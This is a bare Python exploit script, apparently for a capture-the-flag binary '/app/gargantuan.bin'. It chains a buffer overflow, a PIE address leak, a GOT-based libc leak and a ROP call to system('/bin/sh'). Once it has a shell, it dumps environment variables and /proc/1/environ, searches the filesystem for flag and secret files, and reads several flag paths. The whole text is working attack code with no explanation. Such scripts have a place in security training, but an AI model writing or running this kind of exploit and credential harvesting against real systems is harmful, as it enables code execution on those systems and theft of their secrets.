import subprocess, struct, time, select
def p64(x): return struct.pack('<Q', x)
def u64(x): return struct.unpack('<Q', x.ljust(8, b'\x00'))[0]
p = subprocess.Popen(['/app/gargantuan.bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
def read_until(token):
    out = b''
    while token not in out:
        c = p.stdout.read(1)
        if not c: break
        out += c
    return out
prefix = (b'\x41' * 256 + b'\x00' + b'\x41' * 255) * 4
read_until(b'Enter your input below:\n')
p.stdin.write(prefix + b'\x00' + b'\x41' * 295 + b'\xd9')
p.stdin.flush()
read_until(b'OO LATE! ')
leak_str = b''
while True:
    c = p.stdout.read(1)
    if c == b'\n': break
    leak_str += c
pie_base = int(leak_str.decode(), 16) - 0x11e5
print("PIE Base:", hex(pie_base))
read_until(b'Enter your input below:\n')
m_pop_rdi = pie_base + 0x11e0
puts_got = pie_base + 0x4000
puts_plt = pie_base + 0x1030
m_main = pie_base + 0x12d9
m_ret = pie_base + 0x11e1
rop1 = p64(m_pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(m_main)
p.stdin.write(prefix + b'\x00' + b'\x41' * 295 + rop1)
p.stdin.flush()
read_until(b'OO LATE! ')
read_until(b'\n')
puts_leak_raw = p.stdout.read(6)
puts_leak = u64(puts_leak_raw)
libc_base = puts_leak - 0x80e50
print("Libc Base:", hex(libc_base))
read_until(b'Enter your input below:\n')
sys_addr = libc_base + 0x50d70
binsh_addr = libc_base + 0x1d8678
rop2 = p64(m_pop_rdi) + p64(binsh_addr) + p64(m_ret) + p64(sys_addr)
p.stdin.write(prefix + b'\x00' + b'\x41' * 295 + rop2)
p.stdin.flush()
read_until(b'OO LATE! ')
read_until(b'\n')
p.stdin.write(b"echo EXPLOIT_SUCCESS; env; cat /proc/1/environ | tr '\\0' '\\n'; ls -la /; find / -name '*flag*' -o -name '*secret*' 2>/dev/null; cat /app/flag.txt 2>/dev/null; cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null; cat /secret.txt 2>/dev/null\n")
p.stdin.flush()
while True:
    rx, _, _ = select.select([p.stdout], [], [], 2.0)
    if rx:
        out = p.stdout.read(4000)
        if not out: break
        print(out.decode(errors='ignore'))
    else:
        break
EOF
